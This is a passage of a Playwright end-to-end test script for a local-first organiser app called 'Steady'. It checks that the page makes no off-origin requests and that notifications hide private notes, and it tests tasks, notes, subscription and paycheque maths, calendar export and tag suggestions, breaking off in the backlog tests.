/**
 * End-to-end check of the things that are hard to unit test: does the app
 * actually work in a browser, does it survive with no network, and - the claim
 * this whole project rests on - can the page reach the network at all?
 *
 * Run it against a production build:
 *
 *     npm run build
 *     npm i --no-save playwright
 *     node e2e/app-check.mjs
 *
 * It starts and stops its own preview server.
 */
import { spawn } from 'node:child_process';
import { mkdirSync, readFileSync } from 'node:fs';
import { chromium } from 'playwright';

const PORT = 4173;
// Set VITE_BASE to check a subpath deployment (GitHub Pages serves a project
// repo at /<repo>/, which is exactly where absolute paths go wrong).
const PATH_BASE = process.env.VITE_BASE?.trim() ? `/${process.env.VITE_BASE.replace(/^\/+|\/+$/g, '')}/` : '/';
const BASE = `http://127.0.0.1:${PORT}${PATH_BASE}`;
const OUT = process.env.SCREENSHOT_DIR ?? 'e2e/screenshots';
const CHROME = process.env.CHROME_PATH; // unset uses Playwright's own download

mkdirSync(OUT, { recursive: true });

// The preview server serves at VITE_BASE, but dist/ was built with whatever
// base was set when `npm run build` ran. If they disagree every asset 404s and
// the app never mounts - which looks like a mysterious hang, not a mismatch.
// Fail immediately, with the command that fixes it.
{
  const indexHtml = readFileSync('dist/index.html', 'utf8');
  const scriptSrc = /<script[^>]+src="([^"]+)"/.exec(indexHtml)?.[1] ?? '';
  // Compare the base itself, not a prefix: every absolute path starts with
  // "/", so a startsWith check silently passes for a root-built dist.
  const distBase = scriptSrc.slice(0, scriptSrc.indexOf('assets/'));
  if (distBase !== PATH_BASE) {
    // Throw rather than process.exit: exit can truncate a buffered write, and
    // a guard whose message never appears is worse than no guard.
    throw new Error(
      `dist/ was built for a different base.\n` +
        `  serving at : ${PATH_BASE}\n` +
        `  dist built : ${distBase || '(could not parse dist/index.html)'}\n` +
        `Rebuild first: ${PATH_BASE === '/' ? 'npm run build' : `VITE_BASE=${PATH_BASE} npm run build`}`,
    );
  }
}

const server = spawn('npx', ['vite', 'preview', '--port', String(PORT), '--host', '127.0.0.1'], {
  stdio: 'ignore',
  detached: true,
  env: process.env,
});
const stopServer = () => {
  try {
    process.kill(-server.pid, 'SIGKILL');
  } catch {
    /* already gone */
  }
};
process.on('exit', stopServer);
await new Promise((r) => setTimeout(r, 4000));

const problems = [];
const check = (label, actual, expected) => {
  const ok = actual === expected;
  console.log(`${ok ? 'ok  ' : 'FAIL'}  ${label}${ok ? '' : ` (got ${JSON.stringify(actual)})`}`);
  if (!ok) problems.push(label);
};

const browser = await chromium.launch(CHROME ? { executablePath: CHROME } : {});
const ctx = await browser.newContext({
  viewport: { width: 412, height: 915 },
  deviceScaleFactor: 2,
  acceptDownloads: true,
});
const ORIGIN = `http://127.0.0.1:${PORT}`;
await ctx.grantPermissions(['notifications'], { origin: ORIGIN });

// Every request the page or its service worker makes, for the whole run. The
// app's promise is that nothing goes anywhere but its own server; this is the
// run-long record that checks it, alongside the CSP test further down.
const offOrigin = [];
ctx.on('request', (req) => {
  const url = req.url();
  // blob: and data: URLs are made in the page itself - a download of a file
  // built on the phone - and never touch the network.
  if (url.startsWith('blob:') || url.startsWith('data:')) return;
  if (new URL(url).origin !== ORIGIN) offOrigin.push(url);
});

// Record what reminder notifications would show, without relying on the
// headless browser's notification UI. Both routes the app can use are wrapped.
await ctx.addInitScript(() => {
  window.__shown = [];
  const record = (title, options) => window.__shown.push({ title, body: options?.body ?? '' });
  if (typeof ServiceWorkerRegistration !== 'undefined') {
    const original = ServiceWorkerRegistration.prototype.showNotification;
    ServiceWorkerRegistration.prototype.showNotification = function (title, options) {
      record(title, options);
      return original.call(this, title, options).catch(() => undefined);
    };
  }
  if (typeof Notification !== 'undefined') {
    window.Notification = new Proxy(Notification, {
      construct(target, args) {
        record(args[0], args[1]);
        return Reflect.construct(target, args);
      },
    });
  }
});

const page = await ctx.newPage();

/** Every row of one IndexedDB store, read straight from the database. */
const readStore = (store) =>
  page.evaluate(
    (name) =>
      new Promise((resolve) => {
        const req = indexedDB.open('steady');
        req.onsuccess = () => {
          const all = req.result.transaction(name, 'readonly').objectStore(name).getAll();
          all.onsuccess = () => {
            req.result.close();
            resolve(all.result);
          };
        };
      }),
    store,
  );

const consoleErrors = [];
page.on('console', (m) => {
  if (m.type() === 'error') consoleErrors.push(m.text());
});
page.on('pageerror', (e) => consoleErrors.push(`pageerror: ${e.message}`));

const todayKey = (() => {
  const d = new Date();
  return `${d.getFullYear()}-${String(d.getMonth() + 1).padStart(2, '0')}-${String(d.getDate()).padStart(2, '0')}`;
})();

console.log(`Checking ${BASE}\n`);
await page.goto(BASE, { waitUntil: 'networkidle' });
await page.evaluate(() => navigator.serviceWorker.ready);
await page.waitForTimeout(1500);

// --- the app is wired for wherever it is served from ----------------------
// Read the href rather than fetching it: the page's own CSP forbids fetch(),
// which is the point of the policy, so the test must not rely on one either.
const manifestHref = await page.evaluate(() => document.querySelector('link[rel=manifest]').href);
check('the manifest link matches the served path', new URL(manifestHref).pathname, `${PATH_BASE}manifest.webmanifest`);
check(
  'the service worker is scoped to the served path',
  await page.evaluate(async () => new URL((await navigator.serviceWorker.ready).scope).pathname),
  PATH_BASE,
);

// --- the update notice ----------------------------------------------------
// A first-ever launch has not updated from anything, so it must stay silent.
check(
  'says nothing about updates on a first launch',
  await page.locator('text=Steady updated').count(),
  0,
);

// Simulate having last seen an older build, without needing a second deploy.
await page.evaluate(
  () =>
    new Promise((resolve) => {
      const req = indexedDB.open('steady');
      req.onsuccess = () => {
        const tx = req.result.transaction('settings', 'readwrite');
        const store = tx.objectStore('settings');
        const get = store.get('settings');
        get.onsuccess = () => {
          store.put({ ...(get.result ?? { id: 'settings' }), lastSeenBuild: 'an-older-build' });
        };
        tx.oncomplete = () => {
          req.result.close();
          resolve();
        };
      };
    }),
);

await page.reload({ waitUntil: 'networkidle' });
await page.waitForTimeout(600);
check('tells you once when the build has changed', await page.locator('text=Steady updated').count(), 1);
check(
  'reassures you the data is untouched',
  (await page.textContent('.main')).includes('untouched'),
  true,
);
await page.screenshot({ path: `${OUT}/update-notice.png`, fullPage: true });

// The build is recorded as soon as it is shown, so it must not come back.
await page.reload({ waitUntil: 'networkidle' });
await page.waitForTimeout(600);
check('does not repeat on the next launch', await page.locator('text=Steady updated').count(), 0);

// --- a reminder notification says nothing private ------------------------
// A lock screen and a watch can be read by whoever is nearby. Seed a task
// whose reminder is due now, with something private in its notes, and check
// what the notification actually says.
await page.evaluate(
  (today) =>
    new Promise((resolve) => {
      const req = indexedDB.open('steady');
      req.onsuccess = () => {
        const tx = req.result.transaction('tasks', 'readwrite');
        const at = Date.now() - 60_000;
        tx.objectStore('tasks').put({
          id: 'e2e-reminder', title: 'Pick up the prescription', notes: 'Card ending 4417, PIN in wallet',
          steps: [], tags: [], date: today, remindAt: at, createdAt: at, updatedAt: at,
        });
        tx.oncomplete = () => {
          req.result.close();
          resolve();
        };
      };
    }),
  todayKey,
);
await page.reload({ waitUntil: 'networkidle' });
await page.waitForTimeout(1500);
const shown = await page.evaluate(() => window.__shown);
const reminder = shown.find((n) => n.title === 'Pick up the prescription');
check('a due reminder shows a notification', Boolean(reminder), true);
check('the notification does not carry the notes', JSON.stringify(shown).includes('4417'), false);
check('it says the time instead, on a 12-hour clock', /^Reminder for \d{1,2}:\d{2} (AM|PM)$/.test(reminder?.body ?? ''), true);

// --- capture -------------------------------------------------------------
// The box is one line until you are in it; the Save button and the hint about
// Enter appear when you are.
check('the capture box starts as one line, with no Save button showing', await page.locator('button:text-is("Save to inbox")').count(), 0);
await page.fill('#capture-input', 'Call the dentist about the referral\nAsk for Dr Hall. The letter is in the blue folder.');
check('in the box, Save and the hint appear', await page.locator('button:text-is("Save to inbox")').count(), 1);
await page.click('button:text-is("Save to inbox")');
await page.waitForTimeout(400);
check('capture lands in the inbox', await page.textContent('.nav-count'), '1');
check('and the box folds back to one line', await page.locator('button:text-is("Save to inbox")').count(), 0);

// --- inbox item becomes a task with steps, a time and a reminder ---------
await page.click('.nav-btn:has-text("Inbox")');
await page.click('button:has-text("Make it a task")');
await page.waitForSelector('#task-title');
// A two-line capture: the first line is the title, the rest the notes.
check('the first line of a capture becomes the title', await page.inputValue('#task-title'), 'Call the dentist about the referral');
// Notes are there, so the editor opens with them showing rather than folded away.
check('and the rest becomes its notes', await page.inputValue('#task-notes'), 'Ask for Dr Hall. The letter is in the blue folder.');
await page.fill('#task-step', 'Find the referral letter');
await page.click('button:has-text("Add step")');
await page.fill('#task-step', 'Call at 9am when they open');
await page.click('button:has-text("Add step")');
await page.fill('#task-date', todayKey);
await page.fill('#task-time', '09:30');
await page.click('button:has-text("30 min")');
await page.click('button:has-text("10 min before")');
await page.click('form.card button[type="submit"]:has-text("Save")');
await page.waitForTimeout(500);
check('inbox is emptied once the item becomes a task', await page.locator('.nav-count').count(), 0);
check('and it says where the task went', await page.locator('.toast:has-text("Saved to Tasks.")').count(), 1);

// --- a reminder follows the task when its time changes ----------------------
// "10 min before" 9:30 is 9:20. Moving the task to 11:00 must move the
// reminder to 10:50, not leave it behind on the old time.
const dentistRemindAt = async () =>
  (await readStore('tasks')).find((t) => t.title.startsWith('Call the dentist'))?.remindAt;
const localMs = (hh, mm) => page.evaluate(([h, m]) => {
  const d = new Date();
  d.setHours(h, m, 0, 0);
  return d.getTime();
}, [hh, mm]);
check('the reminder is set from the time chosen', await dentistRemindAt(), await localMs(9, 20));
await page.click('.nav-btn:has-text("Today")');
await page.click('button.item-title:has-text("Call the dentist")');
await page.click('button:text-is("Edit")');
await page.waitForSelector('#task-time');
await page.fill('#task-time', '11:00');
await page.click('form.card button[type="submit"]:has-text("Save")');
await page.waitForTimeout(400);
check('moving the time moves the reminder with it', await dentistRemindAt(), await localMs(10, 50));

// --- Android Back closes what is open, then goes home, then leaves ----------
await page.click('.nav-btn:has-text("Tasks")');
await page.click('button:text-is("New task")');
await page.waitForSelector('#task-title');
await page.fill('#task-title', 'Half-written task');
// Switching tab keeps the draft rather than throwing it away.
await page.click('.nav-btn:has-text("Notes")');
await page.waitForTimeout(200);
await page.click('.nav-btn:has-text("Tasks")');
await page.waitForTimeout(200);
check('a half-written task survives a trip to another tab', await page.inputValue('#task-title'), 'Half-written task');
await page.goBack();
await page.waitForTimeout(300);
check('Back closes the editor instead of leaving the app', await page.locator('#task-title').count(), 0);
check('and stays on the same tab', await page.getAttribute('.nav-btn:has-text("Tasks")', 'aria-current'), 'page');
await page.goBack();
await page.waitForTimeout(300);
check('Back from a tab goes to Today', await page.getAttribute('.nav-btn:has-text("Today")', 'aria-current'), 'page');
check('and the app is still open', await page.evaluate(() => Boolean(document.querySelector('.main'))), true);
await page.click('.nav-btn:has-text("Money")');
await page.click('.header button:text-is("Settings")');
await page.click('.header button:text-is("Done")');
await page.waitForTimeout(200);
check('Settings Done goes back where you were', await page.getAttribute('.nav-btn:has-text("Money")', 'aria-current'), 'page');

// --- About: version, what's new, recent updates, and Back ------------------
await page.click('.header button:text-is("Settings")');
await page.click('button:text-is("About and what\'s new")');
await page.waitForTimeout(200);
check('About has its own title', await page.textContent('.header h1'), 'About');
const aboutText = await page.textContent('.main');
check('About shows a version number', /Version \d+/.test(aboutText), true);
check("About lists what's new", (await page.locator('section[aria-label="What\'s new"] li').count()) > 0, true);
const updates = await page.locator('ol[aria-label^="Last 10 updates"] li').count();
check('About lists between 1 and 10 recent updates', updates >= 1 && updates <= 10, true);
await page.goBack();
await page.waitForTimeout(300);
check('Back from About returns to Settings', await page.locator('button:text-is("About and what\'s new")').count(), 1);
await page.goBack();
await page.waitForTimeout(300);
check('and Back again closes Settings', await page.getAttribute('.nav-btn:has-text("Money")', 'aria-current'), 'page');

// --- a subscription, in one journey -------------------------------------
await page.click('.nav-btn:has-text("Money")');
await page.click('button:has-text("Add a subscription")');
await page.waitForSelector('#sub-name');
// A recognised name should fill the category in by itself.
// Service suggestions must be visible buttons with readable names. The
// native datalist this replaced rendered blank rows on Android - you picked
// something invisible and hoped.
await page.fill('#sub-name', 'netf');
await page.waitForTimeout(250);
const suggestion = page.locator('.field button.btn-sm', { hasText: 'Netflix' }).first();
check('a typed prefix offers a named, visible suggestion', await suggestion.count(), 1);
check('the suggestion button is not blank', (await suggestion.textContent()).trim(), 'Netflix');
await suggestion.click();
await page.waitForTimeout(200);
check('taking the suggestion fills the name', await page.inputValue('#sub-name'), 'Netflix');
check(
  'and picks its category too',
  await page.getAttribute('button[aria-pressed="true"]:has-text("TV & film")', 'aria-pressed'),
  'true',
);
await page.fill('#sub-amount', '12.99');
await page.click('button:has-text("More options")');
await page.fill('#sub-cancel', 'Account > Membership > Cancel Membership');
await page.click('form.card button[type="submit"]:has-text("Save")');
await page.waitForTimeout(500);

// Straight to the confirmation, which must show the yearly figure - the number
// that actually changes your mind about a subscription.
const confirmation = await page.textContent('.main');
check('saving lands on the confirmation', confirmation.includes('Netflix is saved'), true);
check('the confirmation shows the yearly cost', confirmation.includes('155.88'), true);
check('the confirmation offers the calendar', await page.locator('button:has-text("Add to my calendar")').count(), 1);

// Take the calendar file and check it is a real, single-subscription calendar.
const download = await Promise.all([
  page.waitForEvent('download'),
  page.click('button:has-text("Add to my calendar")'),
]).then(([d]) => d);
check('the calendar file is named after the subscription', download.suggestedFilename(), 'netflix.ics');
const icsText = await download.createReadStream().then(async (stream) => {
  let out = '';
  for await (const chunk of stream) out += chunk;
  return out;
});
check('the calendar is well formed', icsText.startsWith('BEGIN:VCALENDAR'), true);
check('it holds exactly one event', (icsText.match(/BEGIN:VEVENT/g) ?? []).length, 1);
check('it repeats monthly', icsText.includes('RRULE:FREQ=MONTHLY;INTERVAL=1'), true);
check('it carries the 3-day warning', icsText.includes('TRIGGER:-PT4320M'), true);
// Cancel steps can hold a login, and a calendar is often copied to a Google
// account, so they stay out unless switched on in Settings.
check('it leaves the cancellation steps out by default', icsText.includes('To cancel'), false);
check(
  'and the button says what goes in before you tap it',
  (await page.textContent('.main')).includes('Goes in: the name, the dates and the amount'),
  true,
);
await page.screenshot({ path: `${OUT}/subscription-saved.png`, fullPage: true });

await page.click('button:has-text("Done")');
await page.waitForTimeout(400);
await page.screenshot({ path: `${OUT}/money.png`, fullPage: true });

// --- a name is saved exactly as typed --------------------------------------
// "Gym membership" used to be saved as "Gymmembership": the moment the box held
// "Gym " it matched the Gym preset and was overwritten, space and all.
await page.click('.nav-btn:has-text("Money")');
await page.click('button:has-text("Add a subscription")');
await page.waitForSelector('#sub-name');
await page.locator('#sub-name').pressSequentially('Gym membership', { delay: 15 });
check('a typed name keeps its spaces', await page.inputValue('#sub-name'), 'Gym membership');
check(
  'a new, unsaved subscription has no Delete button',
  await page.locator('form.card button:text-is("Delete")').count(),
  0,
);
await page.click('form.card button:text-is("Cancel")');
await page.waitForTimeout(300);

// --- an every-2-weeks subscription ----------------------------------------
// The yearly figure is the one that would be quietly wrong if any of the
// fortnightly maths were wrong, and the one you would never spot by eye:
// £15 every 2 weeks is £390 a year, not £180 as twice-monthly would imply.
await page.click('.nav-btn:has-text("Money")');
await page.click('button:has-text("Add a subscription")');
await page.waitForSelector('#sub-name');
await page.fill('#sub-name', 'Veg box');
await page.fill('#sub-amount', '15.00');
await page.click('button:has-text("Every 2 weeks")');
await page.waitForTimeout(150);
check(
  'every 2 weeks is selectable without opening More options',
  await page.getAttribute('button[aria-pressed="true"]:has-text("Every 2 weeks")', 'aria-pressed'),
  'true',
);
await page.click('form.card button[type="submit"]:has-text("Save")');
await page.waitForTimeout(500);

const fortnightly = await page.textContent('.main');
check('the confirmation counts 26 charges a year', fortnightly.includes('390.00'), true);
check('the card says how often in plain words', fortnightly.includes('every 2 weeks'), true);
await page.screenshot({ path: `${OUT}/fortnightly.png`, fullPage: true });
await page.click('button:has-text("Done")');
await page.waitForTimeout(300);

// --- a twice-a-month subscription -----------------------------------------
// The other half of the same distinction, and the one that is invisible by eye:
// £15 twice a month is £360 a year, not the £390 the fortnightly one above
// costs. Two charges a year is exactly what separates them.
await page.click('button:has-text("Add a subscription")');
await page.waitForSelector('#sub-name');
await page.fill('#sub-name', 'Cleaner');
await page.fill('#sub-amount', '15.00');
await page.click('form.card button:has-text("Twice a month")');
await page.waitForSelector('#sub-days');
check(
  'twice a month is the highlighted rhythm',
  await page.getAttribute('form.card button:text-is("Twice a month")', 'aria-pressed'),
  'true',
);
check(
  'and monthly, the default, is no longer highlighted',
  await page.getAttribute('form.card button:text-is("Monthly")', 'aria-pressed'),
  'false',
);
check(
  'picking twice a month asks which days, rather than hiding them',
  await page.inputValue('#sub-days'),
  '1, 15',
);
// Typed one character at a time: .fill() would pass even against a box that
// rewrites its own value on every keystroke, which is the bug this guards.
await page.fill('#sub-days', '');
await page.locator('#sub-days').pressSequentially('15, 31');
check('the days box keeps what you type', await page.inputValue('#sub-days'), '15, 31');
await page.click('button:has-text("More options")');
check(
  'and no interval is asked for, because twice a month has none',
  await page.locator('#sub-every').count(),
  0,
);
await page.click('form.card button[type="submit"]:has-text("Save")');
await page.waitForTimeout(500);

const twiceMonthly = await page.textContent('.main');
check('the confirmation counts 24 charges a year', twiceMonthly.includes('360.00'), true);
check(
  'the card names the actual dates',
  twiceMonthly.includes('twice a month, on the 15th and the last day'),
  true,
);
await page.screenshot({ path: `${OUT}/twice-a-month.png`, fullPage: true });
await page.click('button:has-text("Change something")');
await page.waitForSelector('#sub-days');
check('reopening shows the days it charges on', await page.inputValue('#sub-days'), '15, 31');
// Exact text: has-text() matches substrings, and "More options (how to cancel,
// notes, every N cycles)" contains the word too.
await page.click('form.card button:text-is("Cancel")');
await page.waitForTimeout(300);

// A rhythm no button covers must survive a round-trip through the form. If
// picking presets clobbered `every`, an every-2-months bill would silently
// become monthly - doubling its yearly cost and changing its charge dates.
await page.click('button:has-text("Add a subscription")');
await page.waitForSelector('#sub-name');
await page.fill('#sub-name', 'Odd one');
await page.fill('#sub-amount', '20.00');
await page.click('button:has-text("Monthly")');
await page.click('button:has-text("More options")');
await page.fill('#sub-every', '2');
await page.waitForTimeout(150);
check(
  'an uncovered rhythm highlights no preset',
  await page.locator('.btn-row button[aria-pressed="true"]:has-text("Monthly")').count(),
  0,
);
await page.click('form.card button[type="submit"]:has-text("Save")');
await page.waitForTimeout(400);
check(
  'and is costed as every 2 months, not monthly',
  (await page.textContent('.main')).includes('120.00'),
  true,
);
await page.click('button:has-text("Change something")');
await page.waitForSelector('#sub-name');
// No need to open More options: a subscription with a custom interval opens it
// already, so the unusual setting is visible rather than hidden behind a toggle.
check('reopening shows the custom interval without digging', await page.inputValue('#sub-every'), '2');
await page.click('form.card button:has-text("Cancel")');
await page.waitForTimeout(300);

// --- income, and the numbers nobody checks by hand ------------------------
// $2,500 gross / $1,850 net, twice a month. That is 24 paycheques a year, not
// 26 - take-home is $3,700 a month. Getting the frequency wrong here would
// overstate income by two whole paycheques.
await page.click('.nav-btn:has-text("Money")');
await page.click('button:has-text("Add income")');
await page.waitForSelector('#income-name');
check('a new, unsaved income has no Delete button', await page.locator('form.card button:text-is("Delete")').count(), 0);
await page.fill('#income-name', 'Main job');
await page.click('button:has-text("Twice a month")');
await page.click('button:has-text("15th and last day")');
await page.click('button:has-text("The Friday before")');
await page.fill('#income-gross', '2500.00');
await page.fill('#income-net', '1850.00');
await page.click('button:has-text("+ Federal income tax")');
await page.click('button:has-text("+ Social Security")');
const dedAmounts = page.locator('input[aria-label^="Amount for"]');
// Typed a character at a time, not filled in one go. A box that reformats
// itself mid-typing passes .fill() and is unusable by a person: typing
// "1234.56" once produced "5.01", and "15, 31" produced "1".
await dedAmounts.nth(0).click();
await dedAmounts.nth(0).pressSequentially('420.00', { delay: 15 });
check('a deduction box keeps what you type', await dedAmounts.nth(0).inputValue(), '420.00');
await dedAmounts.nth(1).click();
await dedAmounts.nth(1).pressSequentially('155.00', { delay: 15 });

const daysBox = page.locator('input[aria-label="Days of the month you are paid"]');
await daysBox.fill('');
await daysBox.pressSequentially('15, 31', { delay: 15 });
check('the pay-days box keeps what you type', await daysBox.inputValue(), '15, 31');
await page.waitForTimeout(150);
await page.click('form.card button[type="submit"]:has-text("Save")');
await page.waitForTimeout(500);

check('the yearly breakdown is folded away', (await page.textContent('.main')).includes('60,000.00'), false);
await page.click('button:text-is("Show the yearly breakdown")');
await page.waitForTimeout(200);
const moneyText = await page.textContent('.main');
check('take-home is 24 paycheques a year, not 26', moneyText.includes('3,700.00'), true);
check('gross is annualised the same way', moneyText.includes('60,000.00'), true);
check('the deduction breakdown appears', moneyText.includes('Federal income tax'), true);
check(
  'and the typed deduction was stored, not a mangled version',
  await page.evaluate(
    () =>
      new Promise((resolve) => {
        const req = indexedDB.open('steady');
        req.onsuccess = () => {
          const all = req.result.transaction('incomes', 'readonly').objectStore('incomes').getAll();
          all.onsuccess = () => {
            const job = all.result.find((i) => i.name === 'Main job');
            req.result.close();
            resolve(job ? job.deductions.map((d) => d.amountMinor).join(',') : 'NOT FOUND');
          };
        };
      }),
  ),
  '42000,15500',
);
check('the unexplained gap is named, not hidden', moneyText.includes('Not itemized'), true);

// The next payday shown must never be a Saturday or Sunday once shifting is on.
// It reads "Today", "Tomorrow", "Friday, in 3 days" or "Wed, Sep 30 · in 7 days".
const shownPayday = /Next: (Today|Tomorrow|[A-Z][a-z]+)/.exec(moneyText)?.[1];
check('a next payday is shown at all', Boolean(shownPayday), true);
if (shownPayday) {
  const offset = { Today: 0, Tomorrow: 1 }[shownPayday];
  const weekday =
    offset === undefined
      ? shownPayday.slice(0, 3)
      : ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'][new Date(Date.now() + offset * 86_400_000).getDay()];
  check('and it is not on a weekend', ['Sat', 'Sun'].includes(weekday), false);
}
check(
  'the holiday list is there to check',
  await page.locator('text=Days this employer is closed').count() >= 0,
  true,
);
await page.screenshot({ path: `${OUT}/income.png`, fullPage: true });

// --- what is still to come out, and what each cheque has to cover --------
// These are real charge dates against real paydays, not monthly averages. The
// failure worth catching is a period figure larger than the month figure,
// which would mean a pay period leaking past the end of the month.
const flowText = await page.textContent('.main');
check('the money screen says what is still to come out', flowText.includes('Still to come out'), true);
check('and names the rest of the month', flowText.includes('Rest of this month'), true);
check('and what lands before the next payday', flowText.includes('Before your next payday'), true);
check('each paycheck is set against its own bills', flowText.includes('Each paycheck'), true);
check('this paycheck says what it leaves', flowText.includes('Left from this paycheck'), true);
check('the list of charges is not repeated on Money', flowText.includes('Charging in the next'), false);
check('negatives use a real minus sign, never a hyphen', /-\$\d/.test(flowText), false);
check(
  'and says plainly that the remainder is not spare money',
  flowText.includes('rent, food, fuel and everything else'),
  true,
);

// The two figures must be consistent: a pay period ends on or before the last
// day of the month it starts in only sometimes, so period <= month is NOT a
// given - but both must parse as money, and neither may be negative.
const amounts = [...flowText.matchAll(/\$([\d,]+\.\d{2})/g)].map((m) => Number(m[1].replace(/,/g, '')));
check('every figure on the screen parses as money', amounts.every((n) => Number.isFinite(n)), true);
await page.screenshot({ path: `${OUT}/money-flow.png`, fullPage: true });

// --- every 6 months is offered as a button -------------------------------
await page.click('button:has-text("Add a subscription")');
await page.waitForSelector('#sub-name');
await page.fill('#sub-name', 'Domain renewal');
await page.fill('#sub-amount', '18.00');
await page.click('form.card button:text-is("Every 6 months")');
await page.waitForTimeout(200);
check(
  'every 6 months is a button, not a trip to More options',
  await page.getAttribute('form.card button:text-is("Every 6 months")', 'aria-pressed'),
  'true',
);
await page.click('form.card button[type="submit"]:has-text("Save")');
await page.waitForTimeout(500);
const halfYearly = await page.textContent('.main');
check('it is costed as two charges a year', halfYearly.includes('36.00'), true);
check('and described in plain words', halfYearly.includes('every 6 months'), true);
await page.click('button:has-text("Done")');
await page.waitForTimeout(300);

// --- a note --------------------------------------------------------------
await page.click('.nav-btn:has-text("Notes")');
await page.click('button:has-text("New note")');
await page.waitForSelector('#note-title');
await page.fill('#note-title', "Doctor's office");
await page.fill('#note-body', 'Reception: (212) 555-0147\nAsk for Dr Hall.');
await page.click('form.card button[type="submit"]:has-text("Save")');
await page.waitForTimeout(400);

// --- tag suggestions, learned on-device -----------------------------------
// Teach it a theme by writing several tagged notes, then check a brand-new
// note about the same theme gets a suggestion, and that tapping it sticks.
const makeNote = async (title, body, tags) => {
  await page.click('.nav-btn:has-text("Notes")');
  await page.click('button:has-text("New note")');
  await page.waitForSelector('#note-title');
  await page.fill('#note-title', title);
  await page.fill('#note-body', body);
  if (tags) await page.fill('#note-tags', tags);
  await page.click('form.card button[type="submit"]:has-text("Save")');
  await page.waitForTimeout(250);
};

// Below the cold-start floor it must say nothing at all.
await makeNote('Dentist appointment', 'Dentist appointment booked for Tuesday', 'health');
await makeNote('Prescription', 'Prescription ready at the pharmacy', 'health');
await page.click('.nav-btn:has-text("Notes")');
await page.click('button:has-text("New note")');
await page.waitForSelector('#note-title');
await page.fill('#note-body', 'Dentist appointment next week');
await page.waitForTimeout(300);
check(
  'stays silent before it has learned enough',
  await page.locator('button:has-text("+ health")').count(),
  0,
);
await page.click('form.card button:has-text("Cancel")');

// Now push the corpus over the floor.
await makeNote('Hygienist', 'Dentist said to book a hygienist appointment', 'health');
await makeNote('Plumber invoice', 'Invoice from the plumber needs paying', 'money');
await makeNote('Refund', 'Refund for the invoice came through', 'money');
await makeNote('Overcharge', 'Paid the invoice and got a refund on the overcharge', 'money');

await page.click('.nav-btn:has-text("Notes")');
await page.click('button:has-text("New note")');
await page.waitForSelector('#note-title');
await page.fill('#note-title', 'Call the dentist');
await page.fill('#note-body', 'Need to call the dentist about that appointment');
await page.waitForTimeout(400);
check('suggests a tag it learned from me', await page.locator('button:has-text("+ health")').count(), 1);
check('does not suggest the unrelated tag', await page.locator('button:has-text("+ money")').count(), 0);
check(
  'explains itself',
  (await page.textContent('.main')).includes('Because you have used'),
  true,
);

// Tapping the chip must actually put the tag on the saved note.
await page.click('button:has-text("+ health")');
await page.waitForTimeout(200);
check('tapping fills the tag box', await page.inputValue('#note-tags'), 'health');
await page.click('form.card button[type="submit"]:has-text("Save")');
await page.waitForTimeout(400);
check(
  'the tag is saved on the note',
  await page.evaluate(
    () =>
      new Promise((resolve) => {
        const req = indexedDB.open('steady');
        req.onsuccess = () => {
          const tx = req.result.transaction('notes', 'readonly');
          const all = tx.objectStore('notes').getAll();
          all.onsuccess = () => {
            const note = all.result.find((n) => n.title === 'Call the dentist');
            req.result.close();
            resolve(note ? note.tags.join(',') : 'NOT FOUND');
          };
        };
      }),
  ),
  'health',
);
await page.screenshot({ path: `${OUT}/tag-suggestions.png`, fullPage: true });

// --- a notes search points at matching tasks too ------------------------------
await page.click('.nav-btn:has-text("Notes")');
await page.fill('input[aria-label="Search notes"]', 'dentist');
await page.waitForTimeout(200);
check('a notes search says how many tasks match too', await page.locator('button:has-text("matching task")').count(), 1);
await page.click('button:has-text("matching task")');
await page.waitForTimeout(300);
check('and opens Tasks with the same search', await page.inputValue('input[aria-label="Search tasks"]'), 'dentist');

// --- pinning is not an edit -----------------------------------------------------
const doctorNote = async () => (await readStore('notes')).find((n) => n.title === "Doctor's office");
const beforePin = await doctorNote();
await page.click('.nav-btn:has-text("Notes")');
await page.locator('.card', { hasText: "Doctor's office" }).locator('button:text-is("Pin")').click();
await page.waitForTimeout(300);
const afterPin = await doctorNote();
check('pinning a note pins it', afterPin.pinned, true);
check('and does not change when it was last updated', afterPin.updatedAt, beforePin.updatedAt);
check(
  'the Pin button keeps its label and says it is on',
  await page.locator('.card', { hasText: "Doctor's office" }).locator('button:text-is("Pin")').getAttribute('aria-pressed'),
  'true',
);

// The tidy-up screen should offer the same suggestion for an untagged note.
await makeNote('Old note', 'Dentist rang about the appointment', '');
await page.click('.nav-btn:has-text("Notes")');
await page.click('button:has-text("Tidy up untagged notes")');
await page.waitForTimeout(400);
check('tidy-up offers suggestions', await page.locator('button:has-text("+ health")').count() >= 1, true);
await page.screenshot({ path: `${OUT}/tidy-up.png`, fullPage: true });
await page.click('button:has-text("Done")');
await page.waitForTimeout(200);

// --- "Put it back" after "Keep as a note" leaves no duplicate --------------
const libraryNotes = async () =>
  (await readStore('notes')).filter((n) => n.title === 'Library card number 29384').length;
await page.fill('#capture-input', 'Library card number 29384');
await page.click('button:has-text("Save to inbox")');
await page.click('.nav-btn:has-text("Inbox")');
await page.click('button:has-text("Keep as a note")');
await page.waitForTimeout(300);
check('keeping it as a note makes one note', await libraryNotes(), 1);
check('it says where the note went', await page.locator('.toast:has-text("Kept as a note")').count(), 1);
await page.click('.toast button:text-is("Undo")');
await page.waitForTimeout(300);
check('undoing it takes that note away again', await libraryNotes(), 0);
await page.click('button:has-text("Keep as a note")');
await page.waitForTimeout(300);
check('so filing it again leaves exactly one', await libraryNotes(), 1);

// --- today pulls it all together ----------------------------------------
await page.click('.nav-btn:has-text("Today")');
await page.waitForTimeout(400);
const todayText = await page.textContent('.main');
check('the task shows on Today', todayText.includes('Call the dentist'), true);
check('the renewal shows on Today', todayText.includes('Charged today') && todayText.includes('Netflix'), true);
check('with no warning pill on it', await page.locator('.main .pill-warn').count(), 0);
// The box is drawn at 26px; the finger gets 44.
const tickTarget = await page.locator('.item-check-hit').first().boundingBox();
check('a tick box is at least 44 by 44 to a finger', tickTarget.width >= 44 && tickTarget.height >= 44, true);
await page.screenshot({ path: `${OUT}/today.png`, fullPage: true });

// --- the backlog: priority, sorting, and that the sort is remembered ------
// The order is the whole feature. If Critical did not float to the top, or the
// chosen sort reset itself every time the app was opened, the list would be a
// pile rather than a queue.
await page.click('.nav-btn:has-text("Backlog")');
await page.waitForTimeout(300);
check(
  'the backlog starts empty, and says so without calling it a failure',
  (await page.textContent('.main')).includes('Nothing outstanding'),
  true,
);

for (const [title, priority] of [
  ['Order printer ink', 'Low'],
  ['Book the optician', 'Critical'],
]) {
  await page.click('button:has-text("Add something")');
  await page.waitForSelector('#task-title');
